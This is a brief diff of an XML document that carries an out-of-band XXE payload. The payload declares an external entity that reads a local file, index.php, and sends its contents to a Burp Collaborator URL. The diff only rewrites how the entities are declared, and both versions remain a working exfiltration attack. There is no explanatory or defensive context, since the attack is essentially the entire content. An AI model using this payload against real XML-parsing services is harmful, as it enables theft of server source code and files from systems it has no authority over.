@@ -1,7 +1,7 @@
 <?xml version="1.0" ?>
 <!DOCTYPE root [
 <!ENTITY % file SYSTEM "file://index.php">
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://9isvphyn0e9nu8jnwxmaeiplpcv2jr.burpcollaborator.net/%file'>"> 
-%all;
+<!ENTITY % send SYSTEM "http://9isvphyn0e9nu8jnwxmaeiplpcv2jr.burpcollaborator.net/%file">
+%send;
 ]>
-<root>&send;</root>
+<r></r>
